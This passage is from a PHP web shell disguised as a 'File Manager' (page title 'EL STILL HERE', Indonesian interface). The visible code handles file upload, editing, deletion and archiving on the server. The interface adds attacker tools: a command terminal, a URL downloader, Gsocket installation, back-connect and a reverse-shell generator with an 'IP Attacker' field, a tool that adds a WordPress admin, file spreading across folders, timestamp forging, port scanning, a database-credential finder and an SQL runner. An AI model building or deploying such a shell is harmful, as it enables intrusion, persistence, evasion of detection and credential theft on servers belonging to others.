            $message = "$oldName -> $newName";
        } elseif ($postAction === 'chmod') {
            $name = $_POST['name'] ?? ''; $mode = trim($_POST['mode'] ?? '');
            if (strpos($name, '..') !== false || preg_match('#[/\\\\\x00]#', $name)) throw new Exception('Nama salah');
            if (!preg_match('/^[0-7]{3,4}$/', $mode)) throw new Exception('Mode harus 3/4 digit oktal');
            $target = $realPath . DIRECTORY_SEPARATOR . $name;
            if (!file_exists($target)) throw new Exception('Tidak ada');
            if (!@chmod($target, octdec($mode))) throw new Exception('Gagal chmod');
            $message = "$name diubah ke $mode";
        } elseif ($postAction === 'touch') {
            $name = $_POST['name'] ?? ''; $touchTime = $_POST['touch_time'] ?? '';
            if (strpos($name, '..') !== false || preg_match('#[/\\\\\x00]#', $name)) throw new Exception('Nama salah');
            $target = $realPath . DIRECTORY_SEPARATOR . $name;
            if (!file_exists($target)) throw new Exception('Tidak ada');
            $timestamp = strtotime($touchTime);
            if ($timestamp === false) throw new Exception('Format waktu tidak valid');
            if (!@touch($target, $timestamp)) throw new Exception('Gagal touch');
            $message = "$name di-touch ke " . formatMtime($timestamp);
        } elseif ($postAction === 'upload') {
            if (empty($_FILES['file']['name'])) throw new Exception('Kosong');
            $f = $_FILES['file'];
            if ($f['error'] !== UPLOAD_ERR_OK) throw new Exception('Gagal upload');
            $name = basename($f['name']);
            if (preg_match('#[/\\\\\x00]#', $name)) throw new Exception('Nama salah');
            $target = $realPath . DIRECTORY_SEPARATOR . $name;
            if (file_exists($target)) throw new Exception("Sudah ada");
            if (!move_uploaded_file($f['tmp_name'], $target)) throw new Exception('Gagal upload');
            $message = "Upload $name sukses";
        } elseif ($postAction === 'save') {
            $fileName = $_POST['file'] ?? '';
            if (strpos($fileName, '..') !== false || preg_match('#[/\\\\\x00]#', $fileName)) throw new Exception('Nama salah');
            $target = $realPath . DIRECTORY_SEPARATOR . $fileName;
            if (!is_file($target)) throw new Exception('Tidak ada');
            if (file_put_contents($target, $_POST['content'] ?? '') === false) throw new Exception('Gagal simpan');
            $message  = "$fileName tersimpan";
        } elseif ($postAction === 'delete') {
            $name = $_POST['name'] ?? '';
            if (strpos($name, '..') !== false || preg_match('#[/\\\\\x00]#', $name)) throw new Exception('Nama salah');
            $target = $realPath . DIRECTORY_SEPARATOR . $name;
            if (is_dir($target)) {
                if (!rmdir($target)) throw new Exception('Folder tidak kosong');
                $message = "Folder $name dihapus";
            } elseif (is_file($target)) {
                if (!unlink($target)) throw new Exception('Gagal hapus');
                $message = "$name dihapus";
            } else {
                throw new Exception('Tidak ada');
            }
        } elseif ($postAction === 'bulk_delete') {
            $items = $_POST['items'] ?? [];
            if (empty($items)) throw new Exception('Pilih file/folder dulu');
            $count = 0;
            foreach ($items as $item) {
                $name = basename($item); $target = $realPath . DIRECTORY_SEPARATOR . $name;
                if (is_dir($target)) { rmrf($target); $count++; }
                elseif (is_file($target)) { @unlink($target); $count++; }
            }
            $message = "$count item dihapus";
        } elseif ($postAction === 'bulk_zip') {
            $items = $_POST['items'] ?? [];
            if (empty($items)) throw new Exception('Pilih file/folder dulu');
            if (!class_exists('ZipArchive')) throw new Exception('Ekstensi ZipArchive tidak tersedia');
            $zipName = 'archive_' . date('Ymd_His') . '.zip';
            $zipPath = $realPath . DIRECTORY_SEPARATOR . $zipName;
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE) !== TRUE) throw new Exception('Gagal membuat file zip');
            foreach ($items as $item) {
                $name = basename($item); $src = $realPath . DIRECTORY_SEPARATOR . $name;
                if (is_dir($src)) { $zip->addEmptyDir($name); zipRecursive($zip, $src, $name); }
                elseif (is_file($src)) { $zip->addFile($src, $name); }
            }
            $zip->close(); $message = "Berhasil di-zip ke $zipName";
        } elseif ($postAction === 'bulk_unzip') {
            $items = $_POST['items'] ?? [];
            if (empty($items)) throw new Exception('Pilih file zip dulu');
            if (!class_exists('ZipArchive')) throw new Exception('Ekstensi ZipArchive tidak tersedia');
            $count = 0;
            foreach ($items as $item) {
                $name = basename($item);
                if (strtolower(pathinfo($name, PATHINFO_EXTENSION)) !== 'zip') continue;
                $src = $realPath . DIRECTORY_SEPARATOR . $name;
                $zip = new ZipArchive();
                if ($zip->open($src) === TRUE) { $zip->extractTo($realPath); $zip->close(); $count++; }
            }
            if ($count === 0) throw new Exception('Tidak ada file .zip valid');
            $message = "$count file zip berhasil diekstrak";
        } elseif ($postAction === 'bulk_move') {
            $items = $_POST['items'] ?? []; $destDir = trim($_POST['dest_dir'] ?? '');
            if (empty($items)) throw new Exception('Pilih file/folder dulu');
            if ($destDir === '') throw new Exception('Tujuan pindah kosong');
            $destDir = str_replace('\\', '/', $destDir);
            $isDestAbs = ($destDir[0] === '/') || ($isWin && preg_match('#^[a-zA-Z]:/#', $destDir));
            $targetReal = $isDestAbs ? realpath($destDir) : realpath($realPath . '/' . $destDir);
            if ($targetReal === false || !is_dir($targetReal)) throw new Exception('Folder tujuan tidak ditemukan');
            $count = 0;
            foreach ($items as $item) {
                $name = basename($item); $src = $realPath . DIRECTORY_SEPARATOR . $name;
                $dst = $targetReal . DIRECTORY_SEPARATOR . $name;
                if (file_exists($src)) { if (!rename($src, $dst)) throw new Exception("Gagal pindah: $name"); $count++; }
            }
            $message = "$count item dipindahkan";
        } elseif ($postAction === 'bulk_copy') {
            $items = $_POST['items'] ?? [];
            if (empty($items)) throw new Exception('Pilih file/folder dulu');
            $count = 0;
            foreach ($items as $item) {
                $name = basename($item); $src = $realPath . DIRECTORY_SEPARATOR . $name;
                $dst = $realPath . DIRECTORY_SEPARATOR . $name . '_copy';
                if (file_exists($src)) {
                    if (is_dir($src)) {
                        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        @mkdir($dst, 0755, true);
                        foreach ($it as $file) {
                            $targetPath = $dst . DIRECTORY_SEPARATOR . $it->getSubPathName();
                            if ($file->isDir()) @mkdir($targetPath, 0755, true); else @copy($file->getPathname(), $targetPath);
                        }
                    } else { @copy($src, $dst); }
                    $count++;
                }
            }
            $message = "$count item dicopy (ditambahkan _copy)";
        } elseif ($postAction === 'bulk_paste') {
            $clipboard = json_decode($_POST['clipboard'] ?? '[]', true);
            $isCut = isset($_POST['is_cut']) && $_POST['is_cut'] === '1';
            if (empty($clipboard)) throw new Exception('Clipboard kosong');
            $count = 0;
            foreach ($clipboard as $item) {
                $src = $item; $name = basename($item); $dst = $realPath . DIRECTORY_SEPARATOR . $name;
                if (file_exists($src)) {
                    if (realpath($src) === realpath($dst)) continue;
                    if (is_dir($src)) {
                        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        @mkdir($dst, 0755, true);
                        foreach ($it as $file) {
                            $targetPath = $dst . DIRECTORY_SEPARATOR . $it->getSubPathName();
                            if ($file->isDir()) @mkdir($targetPath, 0755, true); else @copy($file->getPathname(), $targetPath);
                        }
                    } else { @copy($src, $dst); }
                    if ($isCut) rmrf($src);
                    $count++;
                }
            }
            $message = "$count item berhasil di-paste";
        }
    } catch (Exception $e) { $error = $e->getMessage(); }
    $_SESSION['flash'] = ['type' => $error ? 'error' : 'success', 'msg' => $error ?: $message];
    header('Location: ' . $redirect); exit;
}

$flash = $_SESSION['flash'] ?? null; unset($_SESSION['flash']);

if (!empty($dirSegments)) {
    $parentSegs = array_slice($dirSegments, 0, -1);
    if (!empty($parentSegs)) {
        $parentDir = implode('/', $parentSegs);
        $parentDirQuery = '?dir=' . encodePath($isAbsolute ? '/' . $parentDir : $parentDir);
    } else {
        $parentDirQuery = '?dir=' . ($isAbsolute ? '/' : ''); 
    }
}

$sortBy = $_GET['sort'] ?? 'name';
$sortOrder = $_GET['order'] ?? 'asc';
if (!in_array($sortBy, ['name','size','perm','owner','mtime'])) $sortBy = 'name';
if (!in_array($sortOrder, ['asc','desc'])) $sortOrder = 'asc';

function sortUrl($key, $currentDir, $sortBy, $sortOrder, $isAbsolute) {
    $newOrder = ($sortBy === $key && $sortOrder === 'asc') ? 'desc' : 'asc';
    $params = [];
    if ($currentDir !== '') $params['dir'] = ($isAbsolute ? '/' : '') . $currentDir;
    $params['sort'] = $key;
    $params['order'] = $newOrder;
    return '?' . http_build_query($params);
}

function sortArrow($key, $sortBy, $sortOrder) {
    if ($sortBy !== $key) return '';
    return $sortOrder === 'asc' ? ' ▲' : ' ▼';
}

$raw = @scandir($realPath);
if ($raw === false) { $scanError = 'Gagal membaca direktori.'; } 
else {
    $items = array_values(array_filter($raw, function ($i) { return $i !== '.' && $i !== '..'; }));
    usort($items, function ($a, $b) use ($realPath, $sortBy, $sortOrder) {
        $aPath = $realPath . DIRECTORY_SEPARATOR . $a;
        $bPath = $realPath . DIRECTORY_SEPARATOR . $b;
        $ad = @is_dir($aPath); $bd = @is_dir($bPath);
        if ($ad !== $bd) return $ad ? -1 : 1;
        switch ($sortBy) {
            case 'size':
                $as = $ad ? 0 : (@filesize($aPath) ?: 0);
                $bs = $bd ? 0 : (@filesize($bPath) ?: 0);
                $cmp = $as <=> $bs; break;
            case 'mtime':
                $as = @filemtime($aPath) ?: 0;
                $bs = @filemtime($bPath) ?: 0;
                $cmp = $as <=> $bs; break;
            case 'perm':
                $as = @fileperms($aPath) ?: 0;
                $bs = @fileperms($bPath) ?: 0;
                $cmp = $as <=> $bs; break;
            case 'owner':
                $as = @fileowner($aPath) ?: 0;
                $bs = @fileowner($bPath) ?: 0;
                $cmp = $as <=> $bs; break;
            default:
                $cmp = strcasecmp($a, $b); break;
        }
        return $sortOrder === 'desc' ? -$cmp : $cmp;
    });
}

$functionStatus = checkFunctions();
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EL STILL HERE</title>
<style>
:root { --burgundy: #800020; --burgundy-hover: #5c0017; --gray-border: #d1d1d6; --gray-bg: #f5f5f7; }
* { box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 100%; margin: 0 auto; padding: 16px 24px; background: var(--gray-bg); color: #1d1d1f; }
h1 { margin: 0 0 12px; font-size: 20px; color: var(--burgundy); }
.card { background: #fff; border-radius: 8px; padding: 12px; box-shadow: 0 1px 3px rgba(0,0,0,.08); margin-bottom: 12px; border: 1px solid var(--gray-border); }
.sys-info { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
.sys-info > div { background: #fff; border: 1px solid var(--gray-border); border-radius: 6px; padding: 6px 10px; font-size: 11px; color: #333; }
.sys-info span { color: var(--burgundy); font-weight: 600; text-transform: uppercase; font-size: 10px; letter-spacing: 0.5px; margin-right: 4px; }
.path-bar { background: #fff; border: 1px solid var(--gray-border); border-radius: 6px; padding: 8px 12px; margin-bottom: 12px; font-size: 13px; word-break: break-all; }
.path-bar a { color: var(--burgundy); text-decoration: none; font-weight: 600; }
.path-bar a:hover { text-decoration: underline; }
.path-sep { color: #999; margin: 0 2px; }

/* TABLE FIX */
table { width: 100%; border-collapse: collapse; table-layout: auto; }
tbody tr { height: 40px; }
th, td { 
    text-align: left; 
    padding: 0 10px; 
    border-bottom: 1px solid var(--gray-border); 
    vertical-align: middle; 
    font-size: 13px;
}
th { font-weight: 700; color: var(--burgundy); font-size: 13px; text-transform: uppercase; letter-spacing: .5px; white-space: nowrap; }
th a { color: var(--burgundy); text-decoration: none; }
th a:hover { text-decoration: underline; }
tr:last-child td { border-bottom: none; }
tbody tr:hover { background: var(--gray-bg); }

.col-check { width: 32px; }
.col-size { width: 70px; text-align: center; }
.col-perm { width: 60px; text-align: center; }
.col-owner { width: 90px; text-align: center; }
.col-mtime { width: 140px; text-align: center; }
.col-actions { width: 480px; } 

.name { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-size: 13px; }
.name a { text-decoration: none; cursor: pointer; }
.name a.dir-link { font-weight: bold; color: var(--burgundy); }
.name a.dir-link:hover { text-decoration: underline; }
.name a.file-link { font-weight: normal; color: #333; }
.name a.file-link:hover { color: var(--burgundy); text-decoration: underline; }

.btn { display: inline-block; padding: 4px 8px; border-radius: 4px; border: 1px solid var(--gray-border); background: #fff; cursor: pointer; font-size: 11px; color: #333; text-decoration: none; font-family: inherit; }
.btn:hover { background: var(--gray-bg); }
.btn-primary { background: var(--burgundy); color: #fff; border-color: var(--burgundy); }
.btn-primary:hover { background: var(--burgundy-hover); }
.btn-danger { color: var(--burgundy); border-color: var(--burgundy); font-weight: bold; }
.btn-danger:hover { background: #ffebee; }
.btn-sm { padding: 2px 6px; font-size: 11px; display: inline-block; line-height: 1.2; }
.btn-up { display: inline-flex; align-items: center; background: var(--burgundy); color: white; border: none; padding: 6px 12px; border-radius: 6px; font-weight: 600; text-decoration: none; margin-bottom: 8px; font-size: 12px; }
.btn-up:hover { background: var(--burgundy-hover); }
.btn-up.disabled { background: #e0e0e0; color: #999; cursor: not-allowed; pointer-events: none; }
.actions { display: flex; gap: 4px; flex-wrap: nowrap; align-items: center; }
.message { padding: 8px 12px; border-radius: 6px; margin-bottom: 12px; font-size: 13px; }
.message.success { background: #e8f5e9; color: #2e7d32; border: 1px solid #c8e6c9; }
.message.error { background: #ffebee; color: var(--burgundy); border: 1px solid #ffcdd2; }
input[type=text], input[type=password], input[type=file], input[type=number], input[type=datetime-local], textarea, select { padding: 6px 8px; border: 1px solid var(--gray-border); border-radius: 4px; font-family: inherit; font-size: 12px; }
input[type=text]:focus, textarea:focus, select:focus, input[type=password]:focus { outline: none; border-color: var(--burgundy); box-shadow: 0 0 0 2px rgba(128,0,32,.15); }

/* FORM BARU 1 BARIS */
.main-form-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
.main-form-row .form-group { flex: 1; min-width: 120px; margin: 0; }
.main-form-row .form-group input[type="file"] { width: 100%; }
.main-form-row select { width: auto; }
.main-form-row .btn { white-space: nowrap; }

/* STYLE FONT & WARNA TABLE */
.size { color: #374151; font-size: 12px; font-family: 'Consolas', 'Courier New', monospace; text-align: center; white-space: nowrap; font-variant-numeric: tabular-nums; vertical-align: middle; font-weight: 600; }
.perm { color: #4b5563; font-family: 'Consolas', 'Courier New', monospace; font-size: 12px; font-weight: 700; white-space: nowrap; text-align: center; }
.owner { color: #4b5563; font-family: 'Consolas', 'Courier New', monospace; font-size: 12px; font-weight: 500; white-space: nowrap; text-align: center; }
.mtime { color: #4b5563; font-size: 12px; white-space: nowrap; font-family: 'Consolas', 'Courier New', monospace; text-align: center; }
.empty { text-align: center; padding: 20px; color: #999; font-size: 13px; }

/* WARNA PERMISSION (Dibikin lebih tegas & terang) */
.perm-red { color: #cc0000 !important; text-shadow: 0 0 1px rgba(204,0,0,0.2); }
.perm-green { color: #059669 !important; text-shadow: 0 0 1px rgba(5,150,105,0.2); }
.perm-blue { color: #2563eb !important; text-shadow: 0 0 1px rgba(37,99,235,0.2); }

/* TERMINAL & TOOLS YANG DIRAPATKAN */
.term-card { background: #2a2a2a; color: #d4d4d4; border-radius: 8px; padding: 12px; margin-bottom: 12px; border: 2px solid var(--gray-border); }
.tools-bar { display: flex; gap: 6px; flex-wrap: wrap; border-bottom: 1px solid #444; padding-bottom: 8px; margin-bottom: 8px; }
.tools-bar .btn-tool { background: #333; color: #fff; border: 1px solid #555; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; display: flex; align-items: center; gap: 4px; transition: 0.2s; }
.tools-bar .btn-tool:hover { background: var(--burgundy); border-color: var(--burgundy); }
.tools-bar .btn-tool.install { border-color: #4caf50; color: #4caf50; }
.tools-bar .btn-tool.install:hover { background: #4caf50; color: #fff; }
.tools-bar .btn-tool.danger { border-color: #ff3333; color: #ff3333; }
.tools-bar .btn-tool.danger:hover { background: #ff3333; color: #fff; }
.tools-bar .btn-tool.warning { border-color: #ffaa00; color: #ffaa00; }
.tools-bar .btn-tool.warning:hover { background: #ffaa00; color: #fff; }
.tools-bar .btn-tool.purple { border-color: #9c27b0; color: #9c27b0; }
.tools-bar .btn-tool.purple:hover { background: #9c27b0; color: #fff; }
.tools-bar .btn-tool.blue { border-color: #2196f3; color: #2196f3; }
.tools-bar .btn-tool.blue:hover { background: #2196f3; color: #fff; }

.term-input-wrap { display: flex; gap: 6px; align-items: stretch; }
.term-input { flex: 1; background: #1e1e1e; border: 1px solid #555; color: #fff; font-family: monospace; padding: 8px 12px; border-radius: 4px; outline: none; font-size: 12px; width: 100%; }
.term-input:focus { border-color: var(--burgundy); }
.term-btn { background: var(--burgundy); color: #fff; border: none; padding: 0 12px; border-radius: 4px; cursor: pointer; font-family: monospace; font-weight: bold; white-space: nowrap; font-size: 12px; }
.term-btn:hover { background: var(--burgundy-hover); }
.term-output { background: #000; color: #4af626; font-family: monospace; padding: 12px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; min-height: 80px; max-height: 400px; font-size: 12px; border: 1px solid #333; margin-top: 10px; }

.bulk-bar { display: flex; gap: 8px; align-items: center; margin-bottom: 10px; background: var(--gray-bg); padding: 10px 12px; border-radius: 6px; border: 1px solid var(--gray-border); flex-wrap: wrap; font-size: 12px; }
.bulk-bar strong { color: var(--burgundy); margin-right: 6px; }
.dropdown { position: relative; display: inline-block; }
.dropdown-content { display: none; position: absolute; background-color: #fff; min-width: 140px; box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2); z-index: 100; border: 1px solid var(--gray-border); border-radius: 4px; overflow: hidden; top: 100%; left: 0; margin-top: 4px; }
.dropdown-content button { color: #333; padding: 8px 12px; text-decoration: none; display: block; width: 100%; text-align: left; border: none; background: none; cursor: pointer; font-size: 12px; border-bottom: 1px solid #f0f0f0; }
.dropdown-content button:last-child { border-bottom: none; }
.dropdown-content button:hover { background-color: var(--gray-bg); color: var(--burgundy); }
.dropdown-content.show { display: block !important; }

.modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; align-items: center; justify-content: center; }
.modal-content { background: #fff; width: 90%; max-width: 800px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; max-height: 90vh; border: 2px solid var(--burgundy); }
.modal-header { padding: 12px 16px; border-bottom: 1px solid var(--gray-border); display: flex; justify-content: space-between; align-items: center; }
.modal-header h3 { margin: 0; font-size: 14px; color: var(--burgundy); }
.modal-close { cursor: pointer; font-size: 20px; font-weight: bold; color: #999; line-height: 1; }
.modal-close:hover { color: var(--burgundy); }
.modal-body { padding: 16px; overflow-y: auto; flex: 1; }
.modal-body textarea { width: 100%; min-height: 350px; font-family: monospace; font-size: 12px; line-height: 1.5; tab-size: 4; border: 1px solid var(--gray-border); }
.modal-footer { padding: 12px 16px; border-top: 1px solid var(--gray-border); text-align: right; }
.form-group { margin-bottom: 12px; }
.form-group label { display: block; margin-bottom: 4px; font-weight: 600; font-size: 12px; color: #333; }
.form-group input, .form-group select, .form-group textarea { width: 100%; padding: 8px; border: 1px solid var(--gray-border); border-radius: 4px; font-size: 12px; }
.form-group textarea { min-height: 100px; font-family: monospace; }
.func-table { width: 100%; border-collapse: collapse; font-size: 12px; }
.func-table th, .func-table td { padding: 6px 10px; border-bottom: 1px solid #eee; text-align: left; }
.func-table th { background: var(--gray-bg); font-size: 11px; }
.func-enabled { color: #2e7d32; font-weight: bold; }
.func-disabled { color: #c62828; font-weight: bold; }
</style>
</head>
<body>
<h1>File Manager</h1>

<div class="sys-info">
    <div><span>IP</span> <?= h($publicIp) ?></div>
    <div><span>Domain</span> <?= h($domain) ?></div>
    <div><span>User</span> <?= h($whoami) ?></div>
    <div><span>Host</span> <?= h($hostname) ?></div>
    <div><span>OS</span> <?= h($osInfo) ?></div>
    <div><span>PHP</span> <?= PHP_VERSION ?></div>
    <div><span>Server</span> <?= h($serverSoftware) ?></div>
    <div><span>Load</span> <?= h($loadInfo) ?></div>
    <?php if ($diskInfo): ?><div><span>Disk</span> <?= h($diskInfo) ?></div><?php endif; ?>
</div>

<?php if ($flash): ?>
    <div class="message <?= h($flash['type']) ?>"><?= h($flash['msg']) ?></div>
<?php endif; ?>

<div class="path-bar"><?= $clickablePath ?? '/' ?></div>

<div class="term-card">
    <div class="tools-bar">
        <form method="post" style="margin:0;">
            <input type="hidden" name="action" value="install_gsocket">
            <button type="submit" class="btn-tool install">Install Gsocket</button>
        </form>
        <form method="post" style="margin:0;">
            <input type="hidden" name="action" value="scan_recent">
            <button type="submit" class="btn-tool">Scan File Terbaru</button>
        </form>
        <button type="button" class="btn-tool" onclick="openTool('backconnect')">Back Connect</button>
        <button type="button" class="btn-tool" onclick="openTool('wp_user')">Add WP Admin</button>
        <button type="button" class="btn-tool danger" onclick="openTool('spread')">Spread File</button>
        <button type="button" class="btn-tool warning" onclick="openTool('port_scan')">Scan Port</button>
        <button type="button" class="btn-tool purple" onclick="openTool('touch_all')">Touch All</button>
        <button type="button" class="btn-tool blue" onclick="openTool('func_test')">Function Tester</button>
        <button type="button" class="btn-tool blue" onclick="openTool('revshell')">Rev Shell</button>
        <button type="button" class="btn-tool blue" onclick="openTool('sql_runner')">SQL Runner</button>
        <form method="post" style="margin:0;">
            <input type="hidden" name="action" value="db_creds">
            <button type="submit" class="btn-tool" style="border-color:#ff5722;color:#ff5722;" onclick="return confirm('Scan folder untuk credentials DB?');">Find DB Creds</button>
        </form>
        <form method="post" style="margin:0;">
            <input type="hidden" name="action" value="malware_scan">
            <button type="submit" class="btn-tool" style="border-color:#e91e63;color:#e91e63;" onclick="return confirm('Scan file PHP untuk pattern malware?');">Malware Scan</button>
        </form>
    </div>

    <div class="main-form-row" style="margin-bottom: 8px;">
        <div class="form-group">
            <form method="post" style="display:flex; gap:4px; width:100%;">
                <input type="hidden" name="action" value="create">
                <input type="text" name="name" placeholder="Buat file/folder..." required style="flex:1;">
                <select name="type" style="width:60px;"><option value="file">File</option><option value="dir">Dir</option></select>
                <button type="submit" class="btn btn-primary">Create</button>
            </form>
        </div>
        <div class="form-group">
            <form method="post" enctype="multipart/form-data" style="display:flex; gap:4px; width:100%;">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="file" required style="flex:1;">
                <button type="submit" class="btn btn-primary">Upload</button>
            </form>
        </div>
    </div>

    <div class="term-input-wrap" style="margin-bottom: 8px;">
        <form method="post" style="display:flex; gap:4px; flex:1;">
            <input type="hidden" name="action" value="terminal">
            <input type="text" name="command" class="term-input" placeholder="Ketik perintah terminal..." value="<?= h($termCmd) ?>" autocomplete="off">
            <button type="submit" class="term-btn">Jalankan</button>
        </form>
        <form method="post" style="display:flex; gap:4px; flex:1;">
            <input type="hidden" name="action" value="download_url">
            <input type="text" name="url" class="term-input" placeholder="Wget/Download URL..." required>
            <input type="text" name="save_as" class="term-input" placeholder="Simpan sbg" style="max-width:80px;">
            <button type="submit" class="term-btn">Download</button>
        </form>
    </div>
    
    <?php if ($termOutput !== '' || $specialOutput !== ''): ?>
    <div class="term-output"><?= h($specialOutput . "\n" . $termOutput) ?></div>
    <?php endif; ?>
</div>

<div id="modal-backconnect" class="modal-overlay">
    <div class="modal-content" style="max-width: 400px;">
        <div class="modal-header"><h3>Back Connect</h3><span class="modal-close" onclick="closeTool('backconnect')">&times;</span></div>
        <form method="post">
            <input type="hidden" name="action" value="backconnect">
            <div class="modal-body">
                <div class="form-group"><label>IP Address</label><input type="text" name="bc_ip" placeholder="192.168.1.1" required></div>
                <div class="form-group"><label>Port</label><input type="number" name="bc_port" placeholder="4444" required></div>
            </div>
            <div class="modal-footer"><button type="submit" class="btn btn-primary">Connect</button></div>
        </form>
    </div>
</div>

<div id="modal-wp_user" class="modal-overlay">
    <div class="modal-content" style="max-width: 400px;">
        <div class="modal-header"><h3>Add WP Admin</h3><span class="modal-close" onclick="closeTool('wp_user')">&times;</span></div>
        <form method="post">
            <input type="hidden" name="action" value="add_wp_user">
            <div class="modal-body">
                <div class="form-group"><label>Username</label><input type="text" name="wp_user" placeholder="admin_baru" required></div>
                <div class="form-group"><label>Password</label><input type="text" name="wp_pass" placeholder="P@ssw0rd123" required></div>
            </div>
            <div class="modal-footer"><button type="submit" class="btn btn-primary">Tambahkan</button></div>
        </form>
    </div>
</div>

<div id="modal-spread" class="modal-overlay">
    <div class="modal-content" style="max-width: 400px;">
        <div class="modal-header"><h3>Spread File</h3><span class="modal-close" onclick="closeTool('spread')">&times;</span></div>
        <form method="post">
            <input type="hidden" name="action" value="spread_file">
            <div class="modal-body">
                <div class="form-group"><label>Jumlah Folder Target (1-100)</label><input type="number" name="spread_count" value="10" min="1" max="100" required></div>
                <div class="form-group"><label>Nama File (Opsional)</label><input type="text" name="spread_name" placeholder="Kosongkan untuk nama random"></div>
            </div>
            <div class="modal-footer"><button type="submit" class="btn btn-primary">Sebarkan</button></div>
        </form>
    </div>
</div>

<div id="modal-port_scan" class="modal-overlay">
    <div class="modal-content" style="max-width: 400px;">
        <div class="modal-header"><h3>Scan Port</h3><span class="modal-close" onclick="closeTool('port_scan')">&times;</span></div>
        <form method="post">
            <input type="hidden" name="action" value="port_scan">
            <div class="modal-body">
                <div class="form-group"><label>Target IP/Domain</label><input type="text" name="scan_target" value="<?= h($domain) ?>" required></div>
                <div style="display:flex; gap:10px;">
                    <div class="form-group" style="flex:1;"><label>Port Awal</label><input type="number" name="scan_start" value="1" min="1" max="65535" required></div>
                    <div class="form-group" style="flex:1;"><label>Port Akhir</label><input type="number" name="scan_end" value="1000" min="1" max="65535" required></div>
                </div>
            </div>
            <div class="modal-footer"><button type="submit" class="btn btn-primary">Mulai Scan</button></div>
        </form>
    </div>
</div>

<div id="modal-touch_all" class="modal-overlay">
    <div class="modal-content" style="max-width: 420px;">
        <div class="modal-header"><h3>Touch All Files/Folders</h3><span class="modal-close" onclick="closeTool('touch_all')">&times;</span></div>
        <form method="post">
            <input type="hidden" name="action" value="touch_all">
            <div class="modal-body">
                <div class="form-group"><label>Waktu (tanggal &amp; jam)</label><input type="datetime-local" name="touch_time" step="1" required></div>
                <div class="form-group">
                    <label style="display:flex; align-items:center; gap:8px; cursor:pointer; font-weight:normal;">
                        <input type="checkbox" name="recursive" value="1" checked style="width:auto;"> Termasuk semua subfolder (recursive)
                    </label>
                </div>
            </div>
            <div class="modal-footer"><button type="submit" class="btn btn-primary">Touch Semua</button></div>
        </form>
    </div>
</div>

<div id="modal-func_test" class="modal-overlay">
    <div class="modal-content" style="max-width: 700px;">
        <div class="modal-header"><h3>PHP Function Tester</h3><span class="modal-close" onclick="closeTool('func_test')">&times;</span></div>
        <div class="modal-body">
            <table class="func-table">
                <thead><tr><th>Function</th><th>Status</th></tr></thead>
                <tbody>
                <?php foreach ($functionStatus as $fn => $status): 
                    $cls = strpos($status, 'DISABLED') !== false ? 'func-disabled' : 'func-enabled';
                ?>
                    <tr><td><code><?= h($fn) ?></code></td><td class="<?= $cls ?>"><?= h($status) ?></td></tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <div class="modal-footer"><button type="button" class="btn" onclick="closeTool('func_test')">Tutup</button></div>
    </div>
</div>

<div id="modal-revshell" class="modal-overlay">
    <div class="modal-content" style="max-width: 700px;">
        <div class="modal-header"><h3>Reverse Shell Generator</h3><span class="modal-close" onclick="closeTool('revshell')">&times;</span></div>
        <div class="modal-body">
            <div class="form-group"><label>IP Attacker</label><input type="text" id="rs_ip" value="<?= h($publicIp) ?>" placeholder="1.2.3.4"></div>
            <div class="form-group"><label>Port Attacker</label><input type="number" id="rs_port" value="4444" placeholder="4444"></div>
            <div class="form-group">
                <label>Jenis Reverse Shell</label>
                <select id="rs_type" onchange="generateRevShell()">
                    <option value="bash">Bash (Linux)</option>
                    <option value="bash_alt">Bash Alt (Linux)</option>
                    <option value="nc">Netcat (Linux)</option>
                    <option value="nc_mkfifo">Netcat + mkfifo (Linux)</option>
                    <option value="python">Python 3</option>
                    <option value="perl">Perl</option>
                    <option value="php">PHP</option>
                    <option value="ruby">Ruby</option>
                    <option value="powershell">PowerShell (Windows)</option>
                    <option value="powershell_b64">PowerShell Base64 (Windows)</option>
                    <option value="socat">Socat (Linux)</option>
                </select>
            </div>
            <div class="form-group">
                <label>Command (copy ini di terminal target):</label>
                <textarea id="rs_output" readonly style="min-height:100px; font-family:monospace; font-size:12px;"></textarea>
            </div>
        </div>
        <div class="modal-footer">
            <button type="button" class="btn" onclick="copyRevShell()">Copy Command</button>
            <button type="button" class="btn" onclick="closeTool('revshell')">Tutup</button>
        </div>
    </div>
</div>

<div id="modal-sql_runner" class="modal-overlay">
    <div class="modal-content" style="max-width: 600px;">
        <div class="modal-header"><h3>SQL Runner</h3><span class="modal-close" onclick="closeTool('sql_runner')">&times;</span></div>
        <form method="post">
            <input type="hidden" name="action" value="sql_run">
            <div class="modal-body">
                <div style="display:flex; gap:10px;">
                    <div class="form-group" style="flex:1;"><label>Host</label><input type="text" name="sql_host" value="localhost"></div>
                    <div class="form-group" style="flex:1;"><label>Database</label><input type="text" name="sql_db" placeholder="db_name"></div>
                </div>
                <div style="display:flex; gap:10px;">
                    <div class="form-group" style="flex:1;"><label>User</label><input type="text" name="sql_user" placeholder="root" required></div>
                    <div class="form-group" style="flex:1;"><label>Password</label><input type="password" name="sql_pass" placeholder="(kosong jika tidak ada)"></div>
                </div>
                <div class="form-group"><label>Query SQL</label><textarea name="sql_query" placeholder="SELECT * FROM users LIMIT 10;" required></textarea></div>
            </div>
            <div class="modal-footer"><button type="submit" class="btn btn-primary">Eksekusi Query</button></div>
        </form>
    </div>
</div>

<div class="card">
    <?php if ($parentDirQuery !== ''): ?>
